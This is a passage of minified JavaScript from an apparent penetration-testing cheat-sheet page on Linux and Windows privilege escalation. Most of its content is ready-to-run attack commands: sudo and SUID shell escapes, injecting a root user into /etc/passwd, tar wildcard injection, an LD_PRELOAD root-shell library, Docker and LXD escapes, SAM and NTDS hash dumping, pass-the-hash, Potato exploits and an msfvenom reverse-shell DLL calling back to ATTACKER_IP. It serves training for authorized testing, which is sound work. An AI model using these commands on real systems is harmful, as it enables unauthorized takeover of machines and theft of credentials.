SeImpersonatePrivilege."),e(),n(403,"li"),t(404,"Checked Backup Operators."),e(),n(405,"li"),t(406,"Checked writable files and directories."),e()()(),n(407,"mat-expansion-panel")(408,"mat-expansion-panel-header")(409,"mat-panel-title"),t(410,"Advanced"),e()(),n(411,"ul")(412,"li"),t(413,"Ran automated enumeration tools."),e(),n(414,"li"),t(415,"Manually verified findings."),e(),n(416,"li"),t(417,"Checked for kernel vulnerabilities."),e()()()()()()(),c()),o&2){let i=h();a(13),r("command",i.windowsIdentity),a(27),r("command",i.windowsUsersGroups),a(5),r("command",i.windowsSystem),a(4),r("command",i.windowsDrivers),a(7),r("command",i.windowsUacChecks),a(7),r("command",i.windowsEventLogs),a(7),r("command",i.windowsStartupProcesses),a(5),r("command",i.windowsNetwork),a(10),r("command",i.windowsCredentialHunting),a(5),r("command",i.windowsRegistryCredentials),a(5),r("command",i.windowsSavedCredentials),a(5),r("command",i.windowsPowerShellHistory),a(13),r("command",i.windowsCredentialArtifacts),a(7),r("command",i.windowsInterestingFiles),a(7),r("command",i.windowsFilePermissions),a(5),r("command",i.windowsServices),a(17),r("command",i.windowsServicePermissions),a(7),r("command",i.windowsUnquotedPaths),a(23),r("command",i.windowsServiceBinary),a(14),r("command",i.windowsServiceRule),a(7),r("command",i.windowsDLLHijacking),a(10),r("command",i.windowsScheduledTasks),a(5),r("command",i.windowsTaskFiltering),a(5),r("command",i.windowsTaskInspect),a(5),r("command",i.windowsTaskFiles),a(5),r("command",i.windowsTaskPermissions),a(7),r("command",i.windowsTaskContext),a(7),r("command",i.windowsAlwaysInstallElevated),a(7),r("command",i.windowsSeImpersonate),a(3),r("command",i.windowsPotato),a(7),r("command",i.windowsBackupOperators),a(4),r("command",i.windowsSecretsDump),a(4),r("command",i.windowsPassTheHash),a(7),r("command",i.windowsNtdsAnalysis),a(7),r("command",i.windowsKernel),a(7),r("command",i.windowsExploitSuggester),a(7),r("command",i.windowsAutomatedEnum),a(4),r("command",i.windowsManualVerify)}}var _=class o{selected="linux";systems=[{id:"linux",label:"Linux PrivEsc"},{id:"windows",label:"Windows PrivEsc"}];route=p(v);router=p(w);destroyRef=p(x);ngOnInit(){this.route.queryParamMap.pipe(A(this.destroyRef)).subscribe(s=>{let i=s.get("system");i&&this.systems.some(m=>m.id===i)&&(this.selected=i)})}basicEnumeration=`
id
whoami
groups
hostname
uname -a
uname -r
arch
cat /etc/issue
cat /etc/os-release
ps aux
env
`;sudoCheck=`
sudo -l
`;sudoHighRisk=`
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/python
(root) NOPASSWD: /usr/bin/perl
(root) NOPASSWD: /usr/bin/tar *
`;sudoVim=`
sudo vim -c ':!/bin/bash'
`;sudoLess=`
sudo less /etc/passwd
!sh
`;sudoFind=`
sudo find . -exec /bin/sh \\; -quit
`;sudoAwk=`
sudo awk 'BEGIN {system("/bin/bash")}'
`;sudoPython=`
sudo python3 -c 'import os; os.system("/bin/bash")'
`;sudoPerl=`
sudo perl -e 'exec "/bin/bash";'
`;processEnumeration=`
ps aux
ps -ef
ps auxww
`;processFilters=`
ps aux | grep root
ps aux | grep -E "python|bash|sh|perl|php"
ps aux | grep -i password
ps auxww | grep -v "\\["
`;processRedFlags=`
root  /usr/bin/python /opt/app/app.py --db-pass=admin123
root  /tmp/backup.sh
root  /home/user/service --token=abcd1234
`;bashHistory=`
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history
`;bashHistorySearch=`
grep -i "password" ~/.bash_history
grep -i "ssh" ~/.bash_history
grep -i "wget" ~/.bash_history
grep -i "curl" ~/.bash_history
`;bashHistorySystem=`
find / -name ".bash_history" 2>/dev/null
find /home -type f -name ".bash_history" 2>/dev/null
`;suidEnumeration=`
find / -perm -u=s -type f 2>/dev/null
`;suidExample=`
find . -exec /bin/sh -p \\; -quit
`;capabilities=`
getcap -r / 2>/dev/null
`;capabilitiesExample=`
/usr/bin/python = cap_setuid+ep
`;capabilitiesExploit=`
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
`;cronEnumeration=`
crontab -l
ls -lah /etc/cron*
cat /etc/crontab
`;pspyMonitoring=`# On Kali: serve a trusted pspy build from the current directory
python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0

# On the authorized Linux host: download and run the 64-bit build
curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/pspy64 -o /tmp/pspy64
chmod 700 /tmp/pspy64
/tmp/pspy64 -pf -i 1000
`;writableFiles=`
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
`;passwdPermissions=`
ls -l /etc/passwd
`;passwdHash=`
openssl passwd w00t
`;passwdInject=`
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
`;passwdSwitch=`
su root2

id
`;kernelEnumeration=`
uname -r
searchsploit linux kernel <version>
`;linuxAutomatedEnum=`
# On Kali: serve the scripts from the current directory
python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0

# On the authorized Linux host: download and run LinPEAS
curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas.log

# LinEnum (alternative, more lightweight)
curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/LinEnum.sh -o /tmp/LinEnum.sh
bash /tmp/LinEnum.sh -t

# linux-smart-enumeration (lse.sh)
curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/lse.sh -o /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l1
`;linuxManualVerify=`
# LinPEAS highlights findings in color (red/yellow = interesting),
# but every "possible" vector must still be confirmed manually:

sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
crontab -l
`;dockerGroups=`
id
groups
`;dockerEscape=`
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
`;lxdEscape=`
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc root disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/sh
`;pathRecon=`
echo $PATH
env | grep PATH
ps aux
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
systemctl list-timers --all
`;pathWritable=`
find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"

echo $PATH | tr ":" "\\n"
`;pathHijack=`
echo -e '#!/bin/bash\\n/bin/bash' > ls

chmod +x ls

export PATH=/tmp:$PATH
`;wildcardExamples=`
sudo /usr/bin/tar -czvf /backup/backup.tar.gz *

sudo zip archive.zip *

sudo rsync -a * /backup/

sudo chown root:root *

sudo chmod 755 *
`;wildcardTar=`
touch -- "--checkpoint=1"

touch -- "--checkpoint-action=exec=bash shell.sh"

sudo tar -czvf /tmp/backup.tar.gz *
`;passwordHunting=`
grep -Ri "password" /home 2>/dev/null

cat ~/.bash_history

cat /var/www/html/config.php
`;sshKeys=`
find / -name id_rsa 2>/dev/null
`;sshKeyPermissions=`
chmod 600 id_rsa
`;sshLogin=`
ssh -i id_rsa user@target
`;sshKeyCrack=`
ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
`;ldPreloadCheck=`
sudo -l
`;ldPreloadCompile=`
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
`;ldPreloadExploit=`
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary>
`;oscpMentalFlow=`
1. id / groups
2. sudo -l
3. SUID
4. Capabilities
5. Cron jobs
6. Writable files
7. Docker / LXD
8. Kernel exploit
`;sudoStrategy=`
sudo -l
# Check allowed binaries in the sudo section of GTFOBins
# Prioritize NOPASSWD, wildcard, SETENV, and env_keep entries
`;writablePriority=`
/etc/sudoers
/etc/passwd
/etc/cron.d/*
/etc/systemd/system/*
~/.bashrc
# Prioritize writable files that influence authentication or root execution
`;pathHijackValidation=`
# Find scripts that may invoke commands without absolute paths
grep -R "system\\|exec\\|popen" /etc 2>/dev/null
grep -R "bash\\|sh" /opt /usr/local 2>/dev/null

# Example weak command usage in a privileged script
tar czf backup.tar.gz *
cp /home/user/file /tmp/
ls /tmp
`;wildcardAnalysis=`
# Identify the privileged wildcard command and inspect its option handling
sudo -l
<binary> --help
man <binary>

# Search for options such as exec, checkpoint, files-from, and rsh
# Derive filenames from supported flags; do not guess them
touch -- "--files-from=/tmp/payload"
sudo rsync -a * /backup/
`;sshKeyFollowUp=`
cat ~/.ssh/authorized_keys
# Check whether the key is accepted for other authorized users or hosts
`;ldPreloadSource=String.raw`// shell.c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}`;kernelExploitTransfer=`
# Treat kernel exploits as a last resort; verify version and requirements first
scp exploit.c user@TARGET:/tmp/
gcc exploit.c -o exploit
./exploit
`;windowsIdentity=`
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all
`;windowsUsersGroups=`
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain
`;windowsSystem=`
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description
wmic product get name,version,vendor
`;windowsDrivers=`
driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer
`;windowsUacChecks=String.raw`REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

[environment]::OSVersion.Version
cmd /c echo %PATH%`;windowsEventLogs=`
wevtutil qe Security /rd:true /f:text | Select-String "/user"
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 }
`;windowsStartupProcesses=`
Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User | Format-List
Get-Process -Id <PID>
Get-Service | Where-Object { $_.DisplayName -like '*Service*' }
`;windowsNetwork=`
ipconfig /all
route print
arp -a
mountvol
`;windowsCredentialHunting=`
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

dir /s *pass*
dir /s *cred*
dir /s *vnc*

dir /b /s unattend.xml
dir /b /s sysprep.inf
`;windowsRegistryCredentials=`
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
`;windowsSavedCredentials=`
cmdkey /list
`;windowsPowerShellHistory=`
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

findstr /i password %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i user %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i net %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i cmdkey %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

doskey /history

type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
`;windowsCredentialArtifacts=String.raw`Get-PSReadLineOption | Select-Object HistorySavePath
Get-Content (Get-PSReadLineOption).HistorySavePath

Import-Clixml C:\scripts\pass.xml
netsh wlan show profiles
netsh wlan show profile NAME key=clear`;windowsInterestingFiles=`
dir /s /b *.txt
dir /s /b C:\\*.kdbx
dir /s /b *.config
dir /s /b *.conf
dir /s /b *.ini
dir /s /b *.xml
dir /s /b *.json
dir /s /b *.ps1
dir /s /b *.bat
dir /s /b *.cmd
dir /s /b *.docx
dir /s /b *.xlsx
dir /s /b *.pdf
dir /s /b *.zip
dir /s /b *.bak
dir /s /b *.old

dir /s /b *password*
dir /s /b *pass*
dir /s /b *cred*
dir /s /b *secret*
dir /s /b *config*
dir /s /b *backup*
dir /s /b *vpn*
dir /s /b *rdp*
dir /s /b *ssh*
dir /s /b *id_rsa*

findstr /spin "password" *
findstr /spin "passwd" *
findstr /spin "pwd" *
findstr /spin "username" *
findstr /spin "connectionstring" *
findstr /spin "apikey" *
findstr /spin "token" *
findstr /spin "secret" *

C:\\Users\\
C:\\Users\\Public\\
C:\\ProgramData\\
C:\\Temp\\
C:\\Windows\\Temp\\
C:\\inetpub\\
C:\\Scripts\\
C:\\Backup\\
C:\\Backups\\
C:\\Tools\\

web.config
app.config
applicationHost.config
Unattend.xml
sysprep.xml
sysprep.inf
`;windowsFilePermissions=String.raw`dir /q C:\path\to\file
icacls "C:\path\to\file"
Get-ChildItem -Path 'C:\path\to\file' | Select-Object Name,Directory,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}`;windowsServices=`
sc query
sc qc ServiceName
wmic service get name,displayname,pathname,startmode

Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName
`;windowsUnquotedPaths=`
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

Get-CimInstance Win32_Service | Select Name,PathName,StartName
`;windowsServiceBinary=`
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -like "*LocalSystem*"} |
Select Name, State, StartMode, StartName

icacls "C:\\Path\\To\\ServiceBinary.exe"

sc qc ServiceName
`;windowsServicePermissions=String.raw`# Inspect a candidate service and its security descriptor
sc.exe qc <SERVICE>
sc.exe sdshow <SERVICE>

# Check permissions on the service executable and its parent directory
icacls "<SERVICE_BINARY>"
icacls "<SERVICE_DIRECTORY>"

# With Sysinternals AccessChk, inspect service permissions for the current user group
accesschk64.exe -uwcqv "Users" <SERVICE>

# Verify whether a low-privileged user can change configuration or write the binary.
# A weak ACL alone is not enough: check the service account and restart/trigger conditions.
`;windowsServiceRule=`
WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT
`;windowsDLLHijacking=`
icacls C:\\ServiceDirectory

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll

sc stop ServiceName
sc start ServiceName
`;windowsScheduledTasks=`
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State"

Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State

schtasks /query
schtasks /query /fo TABLE
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > tasks.txt
`;windowsTaskContext=`
Get-ScheduledTask "TaskName" | Select-Object TaskName,TaskPath,Author,Principal,Triggers,Actions
`;windowsAlwaysInstallElevated=String.raw`# Check both policy hives; both DWORD values must be 0x1 for this misconfiguration
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# Authorized disposable lab only: use a deliberately prepared test MSI
msiexec /quiet /qn /i .\authorized-lab.msi

# Remediation: disable the policy through Group Policy and verify both values are absent or 0.
`;windowsTaskFiltering=`
findstr /i "TaskName Author Run As User Task To Run" tasks.txt

findstr /i "powershell cmd.exe .ps1 .bat .cmd" tasks.txt

findstr /i "\\Microsoft\\" tasks.txt
`;windowsTaskInspect=`
schtasks /query /tn "\\TaskName" /fo LIST /v

Get-ScheduledTask

Get-ScheduledTask | Select TaskName,TaskPath,State

(Get-ScheduledTask "TaskName").Actions
`;windowsTaskFiles=`
dir C:\\ /s *.ps1
dir C:\\ /s *.bat
dir C:\\ /s *.cmd
dir C:\\ /s *.vbs
dir C:\\ /s *.xml
dir C:\\ /s *.config
dir C:\\ /s *.ini

dir C:\\Windows\\System32\\Tasks /s

findstr /spin "password passwd pwd secret token user uid connectionstring" *.xml *.config *.ini *.txt *.ps1 *.bat *.cmd
`;windowsTaskPermissions=`
icacls C:\\Path\\To\\TaskBinary.exe

icacls C:\\Path\\To\\Script.ps1

.accesschk64.exe /accepteula -s -d C:\\Scripts\\
`;windowsSeImpersonate=`
whoami /priv
`;windowsPotato=`
PrintSpoofer64.exe -i -c cmd

GodPotato.exe -cmd cmd
`;windowsBackupOperators=`
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
`;windowsNtdsAnalysis=String.raw`robocopy /B E:\Windows\NTDS .\ntds ntds.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`;windowsSecretsDump=`
impacket-secretsdump -sam sam -system system LOCAL
`;windowsPassTheHash=`
impacket-psexec -hashes :NTHASH Administrator@IP
`;windowsExploitSuggester=`
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database file.xls --systeminfo sysinfo.txt
`;windowsKernel=`
systeminfo
wmic qfe get HotFixID

searchsploit Windows <version>
`;windowsAutomatedEnum=`
.\\winPEASx64.exe
.\\winPEAS.exe

Set-ExecutionPolicy Bypass -Scope Process -Force

Unblock-File .\\PowerUp.ps1
. .\\PowerUp.ps1
Invoke-AllChecks

Unblock-File .\\PrivescCheck.ps1
. .\\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report PrivescCheck.txt

.\\Seatbelt.exe -group=all
`;windowsManualVerify=`
icacls "C:\\Program Files\\..."

sc.exe qc ServiceName

schtasks /query /fo LIST /v

whoami /priv
`;selectTech(s){this.selected=s,this.router.navigate([],{relativeTo:this.route,queryParams:{system:s},replaceUrl:!0})}back(){this.selected="linux"}copy(s){navigator.clipboard.writeText(s)}static \u0275fac=function(i){return new(i||o)};static \u0275cmp=u({type:o,selectors:[["app-privesc"]],decls:15,vars:4,consts:[[1,"scan-page"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],[4,"ngIf"],[1,"detail"],[1,"section-description"],["multi",""],[3,"command"]],template:function(i,m){i&1&&(n(0,"div",0)(1,"div",1)(2,"span",2),t(3,"~"),e(),t(4,"/get.sh/privesc"),e(),l(5,"br"),n(6,"h1",3),t(7,"Privilege Escalation"),e(),n(8,"p",4),t(9," Linux and Windows privilege escalation enumeration, misconfigurations and common vectors. "),e(),n(10,"div",5)(11,"app-section-index",6),E("sectionChange",function(I){return m.selectTech(I)}),e(),n(12,"div",7),S(13,L,460,54,"ng-container",8)(14,M,418,38,"ng-container",8),e()()()),i&2&&(a(11),r("items",m.systems)("activeId",m.selected??""),a(2),r("ngIf",m.selected==="linux"),a(),r("ngIf",m.selected==="windows"))},dependencies:[y,g,C,P,f,b,k,T,O],styles:[".privesc-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto}.title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.page-description[_ngcontent-%COMP%]{margin:0 0 2rem;color:#64748b;font-size:14px}.terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.privesc-section[_ngcontent-%COMP%]{margin-bottom:3rem}.section-header[_ngcontent-%COMP%]{display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem}.section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;color:#94a3b8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;font-weight:700;letter-spacing:.15em;white-space:nowrap}.section-line[_ngcontent-%COMP%]{height:1px;flex:1;background:#1e293b}.grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.card[_ngcontent-%COMP%]{position:relative;display:flex;align-items:flex-start;gap:1rem;min-height:130px;padding:1.25rem;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:18px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.card-content[_ngcontent-%COMP%]{min-width:0}.card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650}.card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.5}.detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;color:#f8fafc}.section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px}.back[_ngcontent-%COMP%]{background:transparent;border:1px solid #334155;color:#e2e8f0;padding:8px 12px;border-radius:8px;cursor:pointer;width:fit-content;transition:background .2s ease,border-color .2s ease,color .2s ease}.back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important}mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px}mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-weight:600}.detail[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.6}.detail[_ngcontent-%COMP%]   strong[_ngcontent-%COMP%]{color:#f8fafc}.detail[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.8;padding-left:1.5rem}@media(max-width:768px){.privesc-page[_ngcontent-%COMP%]{padding:1rem}.title[_ngcontent-%COMP%]{font-size:24px}.grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}}"]})};export{_ as Privesc};
